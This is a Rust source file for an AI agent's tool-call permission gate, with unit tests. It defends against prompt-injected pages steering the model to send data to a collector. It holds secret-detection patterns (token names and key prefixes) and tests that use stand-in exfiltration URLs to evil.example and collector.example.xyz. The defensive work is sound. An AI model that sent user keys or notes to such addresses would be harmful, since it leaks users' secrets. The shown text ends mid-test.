//! The policy gate: decides whether one exact tool call runs, asks, or is refused.
//!
//! The model never holds permissions. It proposes a call; the gate looks at
//! the tool's effect class, its target (a domain, a path, a provider), and the
//! grants the user has given, and answers [`Decision::Allow`],
//! [`Decision::Ask`], or [`Decision::Deny`]. See `docs/05-security-model.md`.
//!
//! | Grant | Covers | Ends |
//! | --- | --- | --- |
//! | Once | These exact arguments, one time | When the call runs |
//! | Session | This tool on this target | At its expiry, or when the session ends |
//!
//! A new target always asks again, and a deny rule beats any grant.
//!
//! Web addresses carry provenance. The gate keeps the domains the user
//! typed, the search provider listed, or the user approved. Once the
//! session has read content Tern did not write (a page, an MCP result), a
//! network call to a domain outside that set asks first, even though
//! network steps are otherwise allowed: an injected page cannot quietly
//! send the model to a collector. An address whose query or fragment
//! carries something that looks like a key, a token, or a session id
//! always asks, and is refused outright when it would go to such a new
//! domain.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};
use serde_json::Value;
use tern_core::EffectClass;
use time::{Duration, OffsetDateTime};

/// What the user's settings say about one effect class.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Mode {
    Allow,
    Ask,
    Deny,
}

/// The gate's answer for one call.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
#[serde(tag = "decision", rename_all = "snake_case")]
pub enum Decision {
    Allow { because: String },
    Ask,
    Deny { reason: String },
}

/// One call the model proposed, as the gate sees it.
#[derive(Clone, Debug, PartialEq, Serialize)]
pub struct CallView<'a> {
    pub tool: &'a str,
    pub effect: EffectClass,
    /// What the call touches: a domain, a vault path, a provider id.
    pub target: Option<&'a str>,
    pub args: &'a Value,
}

/// The user's reply to an approval request.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalAnswer {
    /// Run these exact arguments once.
    AllowOnce,
    /// Allow this tool on this target for the rest of the session, until it expires.
    AllowForSession,
    /// Allow it from now on: adds the suggested permission rule (see
    /// [`crate::permissions::PermissionRule::suggest`]) and allows it now.
    AllowAlways,
    Deny,
}

#[derive(Clone, Debug, PartialEq)]
enum GrantScope {
    /// The canonical JSON of the arguments.
    Exact(String),
    Target(Option<String>),
}

#[derive(Clone, Debug, PartialEq)]
struct Grant {
    tool: String,
    scope: GrantScope,
    expires: Option<OffsetDateTime>,
}

/// Per-class modes. Defaults follow [`EffectClass::asks_by_default`].
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct PolicyConfig {
    pub modes: BTreeMap<EffectClass, Mode>,
    /// How long a session grant lasts.
    pub session_grant_minutes: i64,
    /// Per-tool modes that override the tool's effect class (an MCP tool
    /// the user set to always ask, allow, or refuse). Keyed by tool name.
    #[serde(default)]
    pub tool_modes: BTreeMap<String, Mode>,
    /// The approval mode (#75): read-only, ask, workspace write, full.
    #[serde(default)]
    pub approval: crate::permissions::ApprovalMode,
    /// Permission rules by domain, path and tool (#75).
    #[serde(default)]
    pub rules: Vec<crate::permissions::PermissionRule>,
}

impl Default for PolicyConfig {
    fn default() -> Self {
        let modes = EffectClass::ALL
            .into_iter()
            .map(|c| {
                (
                    c,
                    if c.asks_by_default() {
                        Mode::Ask
                    } else {
                        Mode::Allow
                    },
                )
            })
            .collect();
        Self {
            modes,
            session_grant_minutes: 30,
            tool_modes: BTreeMap::new(),
            approval: crate::permissions::ApprovalMode::default(),
            rules: Vec::new(),
        }
    }
}

impl PolicyConfig {
    pub fn mode(&self, class: EffectClass) -> Mode {
        self.modes.get(&class).copied().unwrap_or(Mode::Ask)
    }

    pub fn with_mode(mut self, class: EffectClass, mode: Mode) -> Self {
        self.modes.insert(class, mode);
        self
    }

    /// The mode for one call: the tool's own setting, else its class's.
    pub fn mode_for(&self, tool: &str, class: EffectClass) -> Mode {
        self.tool_modes
            .get(tool)
            .copied()
            .unwrap_or_else(|| self.mode(class))
    }
}

type Clock = fn() -> OffsetDateTime;

/// Where the session's web addresses came from.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Provenance {
    /// Domains the user typed, search listed, or the user approved.
    known: BTreeSet<String>,
    /// Whether content Tern did not write has entered the session.
    untrusted: bool,
}

impl Provenance {
    /// Whether `host` or a domain it belongs to is known (`docs.rs` covers
    /// `www.docs.rs`, and `www.example.org` covers `example.org`).
    pub fn knows(&self, host: &str) -> bool {
        let host = bare(host);
        self.known.iter().any(|k| {
            host == *k || host.ends_with(&format!(".{k}")) || k.ends_with(&format!(".{host}"))
        })
    }

    pub fn untrusted_seen(&self) -> bool {
        self.untrusted
    }
}

/// A host without `www.`, in lower case.
fn bare(host: &str) -> String {
    let h = host.trim().trim_end_matches('.').to_ascii_lowercase();
    h.strip_prefix("www.").map(str::to_owned).unwrap_or(h)
}

/// The hosts of the web addresses in a text.
pub fn hosts_in(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for (i, _) in text.match_indices("http") {
        let rest = &text[i..];
        let end = rest
            .find(|c: char| {
                c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | ')' | ']' | '`')
            })
            .unwrap_or(rest.len());
        if let Ok(u) = url::Url::parse(&rest[..end])
            && matches!(u.scheme(), "http" | "https")
            && let Some(h) = u.host_str()
        {
            out.push(bare(h));
        }
    }
    // Bare domains the user typed (`read arxiv.org/abs/...`).
    for w in text.split(|c: char| c.is_whitespace() || matches!(c, ',' | ';' | '(' | ')' | '"')) {
        let w = w.trim_end_matches(['.', ':', '!', '?']);
        let host = w.split('/').next().unwrap_or_default();
        let labels: Vec<&str> = host.split('.').collect();
        if !w.contains("://")
            && labels.len() >= 2
            && labels
                .iter()
                .all(|l| !l.is_empty() && l.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'))
            && labels
                .last()
                .is_some_and(|t| t.len() >= 2 && t.chars().all(|c| c.is_ascii_alphabetic()))
        {
            out.push(bare(host));
        }
    }
    out.sort();
    out.dedup();
    out
}

/// Why a URL's query or fragment looks like it carries a secret, if it does.
pub fn secret_in_url(raw: &str) -> Option<String> {
    let u = url::Url::parse(raw).ok()?;
    let mut parts: Vec<(String, String)> = u
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    if let Some(f) = u.fragment() {
        for kv in f.split('&') {
            let (k, v) = kv.split_once('=').unwrap_or(("", kv));
            parts.push((k.to_owned(), v.to_owned()));
        }
    }
    // A path segment can carry a key as well (`/collect/sk-...`); only the
    // known key shapes count there, since commit hashes and ids are common.
    if let Some(segs) = u.path_segments() {
        for seg in segs {
            if let Some(why) = secret_shape(seg).filter(|w| !w.contains("long token")) {
                return Some(why.into());
            }
        }
    }
    const NAMES: &[&str] = &[
        "key",
        "apikey",
        "api_key",
        "token",
        "access_token",
        "auth",
        "secret",
        "password",
        "passwd",
        "session",
        "sessionid",
        "session_id",
        "sid",
        "cookie",
        "jwt",
        "bearer",
        "credential",
        "credentials",
    ];
    for (k, v) in parts {
        let name = k.to_ascii_lowercase().replace('-', "_");
        if v.len() >= 6 && NAMES.contains(&name.as_str()) {
            return Some(format!("its `{k}` parameter carries a value"));
        }
        if let Some(why) = secret_shape(&v) {
            return Some(why.into());
        }
    }
    None
}

/// Whether a value has the shape of a key or token.
fn secret_shape(v: &str) -> Option<&'static str> {
    const PREFIXES: &[(&str, &str)] = &[
        ("sk-", "it carries what looks like an API key"),
        ("sk_", "it carries what looks like an API key"),
        ("ghp_", "it carries what looks like a GitHub token"),
        ("github_pat_", "it carries what looks like a GitHub token"),
        ("xoxb-", "it carries what looks like a Slack token"),
        ("xoxp-", "it carries what looks like a Slack token"),
        ("akia", "it carries what looks like a cloud access key"),
        ("aiza", "it carries what looks like an API key"),
        ("eyj", "it carries what looks like a signed token"),
    ];
    let lower = v.to_ascii_lowercase();
    for (p, why) in PREFIXES {
        if lower.starts_with(p) && v.len() >= p.len() + 12 {
            return Some(why);
        }
    }
    // A long run of letters and digits mixed together: hex or base64 noise
    // the size of a token, not a word or a page number.
    let token: String = v
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '+' | '/' | '='))
        .collect();
    let digits = token.chars().filter(char::is_ascii_digit).count();
    let letters = token.chars().filter(char::is_ascii_alphabetic).count();
    if token.len() == v.len() && v.len() >= 32 && digits >= 4 && letters >= 4 {
        return Some("it carries a long token-like value");
    }
    None
}

/// The gate for one session. Grants live as long as the gate.
#[derive(Clone, Debug)]
pub struct PolicyGate {
    config: PolicyConfig,
    /// The chat's folder, for `./` path rules (#75).
    folder: Option<std::path::PathBuf>,
    grants: Vec<Grant>,
    clock: Clock,
    provenance: Provenance,
}

impl Default for PolicyGate {
    fn default() -> Self {
        Self::new(PolicyConfig::default())
    }
}

impl PolicyGate {
    pub fn new(config: PolicyConfig) -> Self {
        Self {
            config,
            folder: None,
            grants: Vec::new(),
            clock: OffsetDateTime::now_utc,
            provenance: Provenance::default(),
        }
    }

    /// The session's web provenance.
    pub fn provenance(&self) -> &Provenance {
        &self.provenance
    }

    /// Adds the domains in text the user typed or search listed.
    pub fn know_text(&mut self, text: &str) {
        self.provenance.known.extend(hosts_in(text));
    }

    /// Adds one domain the user or search introduced.
    pub fn know_host(&mut self, host: &str) {
        if !host.trim().is_empty() {
            self.provenance.known.insert(bare(host));
        }
    }

    /// Reads a message the user sent: its web addresses become known,
    /// except those inside an untrusted block (an attached MCP resource),
    /// whose presence counts as outside content.
    pub fn note_user_message(&mut self, text: &str) {
        let tag = crate::untrusted::TAG;
        let lower = text.to_ascii_lowercase();
        let (open, close) = (format!("<{tag}"), format!("</{tag}>"));
        let mut own = String::new();
        let mut at = 0;
        while let Some(i) = lower[at..].find(&open) {
            own.push_str(&text[at..at + i]);
            self.provenance.untrusted = true;
            at = match lower[at + i..].find(&close) {
                Some(j) => at + i + j + close.len(),
                None => text.len(),
            };
        }
        own.push_str(&text[at..]);
        self.know_text(&own);
    }

    /// Notes that content Tern did not write entered the session.
    pub fn saw_untrusted(&mut self) {
        self.provenance.untrusted = true;
    }

    /// The extra care a network call to a web address needs, if any:
    /// `Some(Err(reason))` refuses it, `Some(Ok(reason))` asks first.
    pub fn url_risk(&self, call: &CallView<'_>) -> Option<Result<String, String>> {
        if call.effect != EffectClass::Network {
            return None;
        }
        let raw = call.args.get("url").and_then(Value::as_str)?;
        let host = url::Url::parse(raw)
            .ok()
            .and_then(|u| u.host_str().map(bare))
            .or_else(|| call.target.map(bare))?;
        let new = self.provenance.untrusted && !self.provenance.knows(&host);
        match (secret_in_url(raw), new) {
            (Some(why), true) => Some(Err(format!(
                "`{}` would send an address to {host}, a domain only outside content mentioned, and {why}, so Tern did not run it.",
                call.tool
            ))),
            (Some(why), false) => Some(Ok(format!(
                "the address to {host} needs your approval because {why}"
            ))),
            (None, true) => Some(Ok(format!(
                "{host} is a new domain that came from outside content, not from you or your search"
            ))),
            (None, false) => None,
        }
    }

    /// A gate with a fixed clock, for tests of expiry.
    pub fn with_clock(mut self, clock: Clock) -> Self {
        self.clock = clock;
        self
    }

    pub fn config(&self) -> &PolicyConfig {
        &self.config
    }

    /// Sets one tool's own mode (MCP tools), overriding its class.
    pub fn set_tool_mode(&mut self, tool: &str, mode: Mode) {
        self.config.tool_modes.insert(tool.to_owned(), mode);
    }

    /// Sets the chat's folder, for `./` path rules.
    pub fn set_folder(&mut self, folder: Option<&std::path::Path>) {
        self.folder = folder.map(std::path::Path::to_path_buf);
    }

    /// Sets the approval mode and the permission rules (#75).
    pub fn set_approval(
        &mut self,
        mode: crate::permissions::ApprovalMode,
        rules: Vec<crate::permissions::PermissionRule>,
    ) {
        self.config.approval = mode;
        self.config.rules = rules;
    }

    /// Decides one call. Pure apart from dropping expired grants.
    pub fn check(&mut self, call: &CallView<'_>) -> Decision {
        self.check_asking(call, false)
    }

    /// [`Self::check`] for a call the tool itself says needs approval
    /// (`ask`, see [`crate::tools::Tool::asks_because`]): an allowed effect
    /// becomes Ask, an earlier approval of the same call or target still
    /// counts, and a refusal in the user's settings still refuses.
    pub fn check_asking(&mut self, call: &CallView<'_>, ask: bool) -> Decision {
        let facts = crate::permissions::CallFacts {
            tool: call.tool,
            host: None,
            detail: call_detail_line(call.args),
            ..Default::default()
        };
        self.check_full(call, ask, &facts, false)
    }

    /// [`Self::check_asking`] with what the permission rules look at
    /// (`facts`: the domain, the paths, the command) and whether the call
    /// stays inside the chat's folder under the sandbox (`confined`).
    ///
    /// Order: a deny rule, Read-only, the tool's own setting refusing,
    /// then an ask or allow rule, then the approval mode, then the class
    /// setting. The web provenance checks ask or refuse in every mode.
    pub fn check_full(
        &mut self,
        call: &CallView<'_>,
        ask: bool,
        facts: &crate::permissions::CallFacts<'_>,
        confined: bool,
    ) -> Decision {
        use crate::permissions::{ApprovalMode, mode_verdict, rule_verdict};
        let now = (self.clock)();
        self.grants.retain(|g| g.expires.is_none_or(|t| t > now));
        let host = facts.host.map(str::to_owned).or_else(|| {
            call.args
                .get("url")
                .and_then(Value::as_str)
                .and_then(crate::permissions::host_of)
        });
        let folder = facts
            .folder
            .map(std::path::Path::to_path_buf)
            .or_else(|| self.folder.clone());
        let home = facts.home.clone().or_else(|| {
            std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" })
                .map(std::path::PathBuf::from)
        });
        let facts = crate::permissions::CallFacts {
            tool: call.tool,
            host: host.as_deref(),
            paths: facts.paths.clone(),
            detail: facts.detail.clone(),
            folder: folder.as_deref(),
            home,
        };
        // #77: a new file in Ask mode is never created on the word of a
        // relative `./…` rule (the old "Always allow writes in ./**",
        // which covered the folder of every chat): the card shows first.
        // A rule naming the folder itself still allows it.
        let creates = self.config.approval == ApprovalMode::Ask
            && call.tool == "file_write"
            && !facts.paths.is_empty()
            && facts.paths.iter().all(|p| !p.exists());
        let rule = match rule_verdict(&self.config.rules, &facts) {
            Some((Mode::Allow, r)) if creates && r.every_folder() => {
                let narrow: Vec<_> = self
                    .config
                    .rules
                    .iter()
                    .filter(|r| !(r.action == Mode::Allow && r.every_folder()))
                    .cloned()
                    .collect();
                rule_verdict(&narrow, &facts).map(|(m, r)| (m, r.line()))
            }
            v => v.map(|(m, r)| (m, r.line())),
        };
        if let Some((Mode::Deny, line)) = &rule {
            return Decision::Deny {
                reason: format!(
                    "Your rule \"{line}\" refuses `{}`, so it did not run.",
                    call.tool
                ),
            };
        }
        let approval = self.config.approval;
        let by_mode = mode_verdict(approval, call.effect, confined);
        if by_mode == Some(Mode::Deny) {
            return Decision::Deny {
                reason: format!(
                    "Tern is in Read-only mode, so `{}` did not run. Switch the approval mode to Ask to let it ask you.",
                    call.tool
                ),
            };
        }
        let own = self.config.tool_modes.contains_key(call.tool);
        let mut mode = self.config.mode_for(call.tool, call.effect);
        let ruled = match &rule {
            Some((m, _)) if mode != Mode::Deny => {
                mode = *m;
                true
            }
            _ => false,
        };
        if !ruled && by_mode == Some(Mode::Allow) && mode == Mode::Ask {
            mode = Mode::Allow;
        }
        if ask && mode == Mode::Allow && !ruled && approval != ApprovalMode::Full {
            mode = Mode::Ask;
        }
        // #76: in Ask mode every file change (a write, a rename, a delete)
        // shows its card before it happens, whatever the class settings
        // say; only the user's own rule or per-tool setting skips it.
        if approval == ApprovalMode::Ask
            && mode == Mode::Allow
            && !ruled
            && !own
            && matches!(
                call.effect,
                EffectClass::ExternalSideEffect | EffectClass::Destructive
            )
        {
            mode = Mode::Ask;
        }
        if mode != Mode::Deny {
            match self.url_risk(call) {
                Some(Err(reason)) => return Decision::Deny { reason },
                Some(Ok(_)) => mode = Mode::Ask,
                None => {}
            }
        }
        match mode {
            Mode::Deny if own => Decision::Deny {
                reason: format!("Your settings refuse `{}`, so it did not run.", call.tool),
            },
            Mode::Deny => Decision::Deny {
                reason: format!(
                    "Your settings refuse {} steps, so `{}` did not run.",
                    call.effect.label(),
                    call.tool
                ),
            },
            Mode::Allow if ruled => Decision::Allow {
                because: format!(
                    "your rule \"{}\" allows it",
                    rule.as_ref().map(|r| r.1.as_str()).unwrap_or_default()
                ),
            },
            Mode::Allow if own => Decision::Allow {
                because: format!("you allowed `{}`", call.tool),
            },
            Mode::Allow if by_mode == Some(Mode::Allow) => Decision::Allow {
                because: format!("the approval mode is {}", approval.label()),
            },
            Mode::Allow => Decision::Allow {
                because: format!("{} steps are allowed", call.effect.label()),
            },
            Mode::Ask => {
                let exact = canonical(call.args);
                let target = call.target.map(str::to_owned);
                match self.grants.iter().find(|g| {
                    g.tool == call.tool
                        && match &g.scope {
                            GrantScope::Exact(a) => *a == exact,
                            GrantScope::Target(t) => *t == target,
                        }
                }) {
                    Some(g) => Decision::Allow {
                        because: match g.scope {
                            GrantScope::Exact(_) => "approved once".into(),
                            GrantScope::Target(_) => "approved for this session".into(),
                        },
                    },
                    None => Decision::Ask,
                }
            }
        }
    }

    /// Records the user's answer for `call`. Returns whether it may run.
    pub fn answer(&mut self, call: &CallView<'_>, answer: ApprovalAnswer) -> bool {
        match answer {
            ApprovalAnswer::Deny => false,
            ApprovalAnswer::AllowOnce => {
                self.grants.push(Grant {
                    tool: call.tool.to_owned(),
                    scope: GrantScope::Exact(canonical(call.args)),
                    expires: None,
                });
                true
            }
            ApprovalAnswer::AllowAlways => {
                let rule = crate::permissions::PermissionRule::suggest_in(
                    call.tool,
                    call.effect,
                    call.target,
                    call.args,
                    self.folder.as_deref(),
                );
                if !self.config.rules.contains(&rule) {
                    self.config.rules.push(rule);
                }
                self.answer(call, ApprovalAnswer::AllowForSession)
            }
            ApprovalAnswer::AllowForSession => {
                if call.effect == EffectClass::Network
                    && let Some(t) = call.target
                {
                    self.know_host(t);
                }
                self.grants.push(Grant {
                    tool: call.tool.to_owned(),
                    scope: GrantScope::Target(call.target.map(str::to_owned)),
                    expires: Some(
                        (self.clock)() + Duration::minutes(self.config.session_grant_minutes),
                    ),
                });
                true
            }
        }
    }

    /// Spends a one-time grant once its call has run.
    pub fn consume(&mut self, call: &CallView<'_>) {
        let exact = GrantScope::Exact(canonical(call.args));
        if let Some(i) = self
            .grants
            .iter()
            .position(|g| g.tool == call.tool && g.scope == exact)
        {
            self.grants.remove(i);
        }
    }
}

/// A call's query or command line, for tool rules.
pub fn call_detail_line(args: &Value) -> String {
    ["command", "query", "code", "path", "url"]
        .iter()
        .find_map(|k| args.get(*k).and_then(Value::as_str))
        .unwrap_or_default()
        .chars()
        .take(400)
        .collect()
}

/// JSON with object keys sorted, so equal arguments compare equal.
fn canonical(v: &Value) -> String {
    fn sort(v: &Value) -> Value {
        match v {
            Value::Object(m) => {
                let sorted: BTreeMap<_, _> = m.iter().map(|(k, v)| (k.clone(), sort(v))).collect();
                Value::Object(sorted.into_iter().collect())
            }
            Value::Array(a) => Value::Array(a.iter().map(sort).collect()),
            other => other.clone(),
        }
    }
    sort(v).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn call<'a>(
        tool: &'a str,
        effect: EffectClass,
        target: Option<&'a str>,
        args: &'a Value,
    ) -> CallView<'a> {
        CallView {
            tool,
            effect,
            target,
            args,
        }
    }

    #[test]
    fn a_tool_mode_overrides_its_class() {
        let mut g = PolicyGate::default();
        let a = json!({});
        let c = call(
            "mcp__notes__search",
            EffectClass::ExternalSideEffect,
            None,
            &a,
        );
        assert_eq!(g.check(&c), Decision::Ask);
        g.set_tool_mode("mcp__notes__search", Mode::Allow);
        assert!(
            matches!(g.check(&c), Decision::Allow { because } if because.contains("you allowed"))
        );
        g.set_tool_mode("mcp__notes__search", Mode::Deny);
        assert!(matches!(g.check(&c), Decision::Deny { .. }));
        // Other tools of the class are untouched.
        let other = call("mcp__x__y", EffectClass::ExternalSideEffect, None, &a);
        assert_eq!(g.check(&other), Decision::Ask);
    }

    #[test]
    fn defaults_allow_safe_classes_and_ask_for_risky_ones() {
        let mut g = PolicyGate::default();
        let a = json!({});
        assert!(matches!(
            g.check(&call("read_note", EffectClass::Read, None, &a)),
            Decision::Allow { .. }
        ));
        assert!(matches!(
            g.check(&call("web_search", EffectClass::Network, None, &a)),
            Decision::Allow { .. }
        ));
        assert_eq!(
            g.check(&call("delete_note", EffectClass::Destructive, None, &a)),
            Decision::Ask
        );
        assert_eq!(
            g.check(&call("post", EffectClass::ExternalSideEffect, None, &a)),
            Decision::Ask
        );
    }

    #[test]
    fn deny_rule_beats_a_grant() {
        let mut g = PolicyGate::new(
            PolicyConfig::default().with_mode(EffectClass::Destructive, Mode::Deny),
        );
        let a = json!({"path": "notes/a.md"});
        let c = call(
            "delete_note",
            EffectClass::Destructive,
            Some("notes/a.md"),
            &a,
        );
        g.answer(&c, ApprovalAnswer::AllowForSession);
        assert!(matches!(g.check(&c), Decision::Deny { .. }));
    }

    #[test]
    fn once_covers_exact_arguments_only_and_is_spent() {
        let mut g = PolicyGate::default();
        let a = json!({"path": "a.md", "force": true});
        let same_reordered: Value =
            serde_json::from_str(r#"{"force":true,"path":"a.md"}"#).unwrap();
        let other = json!({"path": "b.md", "force": true});
        let c = call("delete_note", EffectClass::Destructive, Some("a.md"), &a);
        assert!(g.answer(&c, ApprovalAnswer::AllowOnce));
        assert!(matches!(
            g.check(&call(
                "delete_note",
                EffectClass::Destructive,
                Some("a.md"),
                &same_reordered
            )),
            Decision::Allow { .. }
        ));
        assert_eq!(
            g.check(&call(
                "delete_note",
                EffectClass::Destructive,
                Some("b.md"),
                &other
            )),
            Decision::Ask
        );
        g.consume(&c);
        assert_eq!(g.check(&c), Decision::Ask);
    }

    #[test]
    fn session_grant_is_scoped_to_its_target() {
        let mut g = PolicyGate::default();
        let a = json!({"to": "github.com"});
        let c = call(
            "push",
            EffectClass::ExternalSideEffect,
            Some("github.com"),
            &a,
        );
        g.answer(&c, ApprovalAnswer::AllowForSession);
        let a2 = json!({"to": "github.com", "branch": "x"});
        assert!(matches!(
            g.check(&call(
                "push",
                EffectClass::ExternalSideEffect,
                Some("github.com"),
                &a2
            )),
            Decision::Allow { .. }
        ));
        let a3 = json!({"to": "gitlab.com"});
        assert_eq!(
            g.check(&call(
                "push",
                EffectClass::ExternalSideEffect,
                Some("gitlab.com"),
                &a3
            )),
            Decision::Ask,
            "a new target must ask again"
        );
        assert_eq!(
            g.check(&call(
                "post",
                EffectClass::ExternalSideEffect,
                Some("github.com"),
                &a
            )),
            Decision::Ask,
            "a grant covers one tool"
        );
    }

    fn t0() -> OffsetDateTime {
        OffsetDateTime::UNIX_EPOCH
    }
    fn t31() -> OffsetDateTime {
        OffsetDateTime::UNIX_EPOCH + Duration::minutes(31)
    }

    #[test]
    fn session_grants_expire() {
        let mut g = PolicyGate::default().with_clock(t0);
        let a = json!({});
        let c = call(
            "push",
            EffectClass::ExternalSideEffect,
            Some("github.com"),
            &a,
        );
        g.answer(&c, ApprovalAnswer::AllowForSession);
        assert!(matches!(g.check(&c), Decision::Allow { .. }));
        let mut later = g.with_clock(t31);
        assert_eq!(later.check(&c), Decision::Ask);
    }

    fn read(url: &str) -> Value {
        json!({"url": url})
    }

    fn net<'a>(args: &'a Value, target: &'a str) -> CallView<'a> {
        CallView {
            tool: "read_url",
            effect: EffectClass::Network,
            target: Some(target),
            args,
        }
    }

    #[test]
    fn new_domains_from_outside_content_ask_first() {
        let mut g = PolicyGate::default();
        g.note_user_message("Summarise https://en.wikipedia.org/wiki/Tern for me");
        let other = read("https://collector.example.xyz/c?d=notes");
        // Before any outside content, a model-chosen read still runs.
        assert!(matches!(
            g.check(&net(&other, "collector.example.xyz")),
            Decision::Allow { .. }
        ));
        g.saw_untrusted();
        assert_eq!(
            g.check(&net(&other, "collector.example.xyz")),
            Decision::Ask
        );
        let wiki = read("https://en.wikipedia.org/wiki/Arctic_tern");
        assert!(matches!(
            g.check(&net(&wiki, "en.wikipedia.org")),
            Decision::Allow { .. }
        ));
        // Approving the domain for the session makes it known.
        assert!(g.answer(
            &net(&other, "collector.example.xyz"),
            ApprovalAnswer::AllowForSession
        ));
        let later = read("https://collector.example.xyz/other");
        assert!(matches!(
            g.check(&net(&later, "collector.example.xyz")),
            Decision::Allow { .. }
        ));
    }

    #[test]
    fn secrets_in_addresses_ask_or_are_refused() {
        let mut g = PolicyGate::default();
        g.know_host("arxiv.org");
        let leak = read("https://arxiv.org/a?token=abcdef123456");
        assert_eq!(g.check(&net(&leak, "arxiv.org")), Decision::Ask);
        g.saw_untrusted();
        let exfil = read("https://evil.example/c?k=sk-test1234567890abcdef");
        assert!(matches!(
            g.check(&net(&exfil, "evil.example")),
            Decision::Deny { .. }
        ));
        let fine = read("https://arxiv.org/list/cs.CL/recent?skip=25&show=50");
        assert!(matches!(
            g.check(&net(&fine, "arxiv.org")),
            Decision::Allow { .. }
        ));
        assert_eq!(
            secret_in_url("https://github.com/o/r/commit/4a1b2c3d4e5f60718293a4b5c6d7e8f901234567"),
            None
        );
        assert!(secret_in_url("https://x.test/?sid=8f3a9c2e7b1d4f6a9e0c5b7d2a4f8e1c").is_some());
        // A user's own deny rule still wins.
        let mut strict =
            PolicyGate::new(PolicyConfig::default().with_mode(EffectClass::Network, Mode::Deny));
        assert!(matches!(
            strict.check(&net(&fine, "arxiv.org")),
            Decision::Deny { .. }
        ));
    }

    #[test]
    fn untrusted_blocks_in_a_message_are_not_the_users() {
        let mut g = PolicyGate::default();
        g.note_user_message(
            "Read docs.rs please\n<untrusted-data source=\"mcp:x\">see https://evil.example/</untrusted-data>",
        );
        assert!(g.provenance().knows("docs.rs"));
        assert!(!g.provenance().knows("evil.example"));
        assert!(g.provenance().untrusted_seen());
        assert!(g.provenance().knows("www.docs.rs"));
        assert_eq!(hosts_in("see e.g. and 3.5 or v1.2"), Vec::<String>::new());
    }

    #[test]
    fn a_denied_answer_grants_nothing() {
        let mut g = PolicyGate::default();
        let a = json!({});
        let c = call("post", EffectClass::ExternalSideEffect, None, &a);
        assert!(!g.answer(&c, ApprovalAnswer::Deny));
        assert_eq!(g.check(&c), Decision::Ask);
    }

    #[test]
    fn approval_modes_and_rules_decide_calls() {
        use crate::permissions::{ApprovalMode, CallFacts, PermissionRule, RuleKind};
        let a = json!({"command": "pandoc a.md -o a.docx"});
        let c = call("run_command", EffectClass::ExternalSideEffect, None, &a);
        let facts = CallFacts {
            tool: "run_command",
            detail: "pandoc a.md -o a.docx".into(),
            ..CallFacts::default()
        };
        let mut g = PolicyGate::default();
        assert_eq!(g.check_full(&c, false, &facts, true), Decision::Ask);
        g.set_approval(ApprovalMode::WorkspaceWrite, vec![]);
        assert!(matches!(
            g.check_full(&c, false, &facts, true),
            Decision::Allow { .. }
        ));
        assert_eq!(g.check_full(&c, false, &facts, false), Decision::Ask);
        g.set_approval(ApprovalMode::ReadOnly, vec![]);
        assert!(matches!(
            g.check_full(&c, false, &facts, true),
            Decision::Deny { .. }
        ));
        // Reads still run in Read-only.
        let r = json!({"query": "x"});
        let rc = call("web_search", EffectClass::Network, None, &r);
        assert!(matches!(g.check(&rc), Decision::Allow { .. }));
        g.set_approval(ApprovalMode::Full, vec![]);
        assert!(matches!(
            g.check_full(&c, true, &facts, false),
            Decision::Allow { .. }
        ));
        // A deny rule beats Full; an allow rule beats Ask.
        g.set_approval(
            ApprovalMode::Full,
            vec![PermissionRule::new(
                RuleKind::Tool,
                "run_command pandoc *",
                Mode::Deny,
            )],
        );
        assert!(matches!(
            g.check_full(&c, false, &facts, true),
            Decision::Deny { .. }
        ));
        g.set_approval(
            ApprovalMode::Ask,
            vec![PermissionRule::new(
                RuleKind::Tool,
                "run_command pandoc *",
                Mode::Allow,
            )],
        );
        assert!(matches!(
            g.check_full(&c, false, &facts, false),
            Decision::Allow { .. }
        ));
    }

    /// #77 (step 7 of the #76 Windows test): a new file in Ask mode
    /// shows its card unless a rule names the folder; the old relative
    /// `./**` rule no longer creates files silently, and says so when a
    /// rule does allow it.
    #[test]
    fn ask_mode_new_file_write_asks_unless_a_rule_names_the_folder() {
        use crate::permissions::{ApprovalMode, CallFacts, PermissionRule, RuleKind};
        let dir = std::env::temp_dir().join(format!("tern-policy-77-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let new_file = dir.join("notes.md");
        let _ = std::fs::remove_file(&new_file);
        let a = json!({"path": "notes.md", "text": "# Notes\n"});
        let c = call(
            "file_write",
            EffectClass::ExternalSideEffect,
            Some("Tern testing/notes.md"),
            &a,
        );
        let facts = CallFacts {
            tool: "file_write",
            paths: vec![new_file.clone()],
            folder: Some(&dir),
            ..CallFacts::default()
        };
        // No rule: the card.
        let mut g = PolicyGate::default();
        g.set_folder(Some(&dir));
        assert_eq!(g.check_full(&c, false, &facts, true), Decision::Ask);
        // The old "Always allow writes in ./**": still the card for a new file.
        let every = PermissionRule::new(RuleKind::Path, "./**", Mode::Allow);
        g.set_approval(ApprovalMode::Ask, vec![every.clone()]);
        assert_eq!(g.check_full(&c, false, &facts, true), Decision::Ask);
        // ... but it still covers an edit of a file that exists.
        std::fs::write(&new_file, "old").unwrap();
        match g.check_full(&c, false, &facts, true) {
            Decision::Allow { because } => assert!(because.contains("./**"), "{because}"),
            d => panic!("{d:?}"),
        }
        std::fs::remove_file(&new_file).unwrap();
        // A rule naming this folder allows the new file, and says which rule.
        let pat = format!("{}/**", crate::permissions::norm(&dir));
        g.set_approval(
            ApprovalMode::Ask,
            vec![PermissionRule::new(
                RuleKind::Path,
                pat.clone(),
                Mode::Allow,
            )],
        );
        match g.check_full(&c, false, &facts, true) {
            Decision::Allow { because } => {
                assert!(because.starts_with("your rule"), "{because}");
                assert!(because.contains(&pat), "{because}");
            }
            d => panic!("{d:?}"),
        }
        // Always allow on the card adds that folder rule, not `./**`.
        let mut g = PolicyGate::default();
        g.set_folder(Some(&dir));
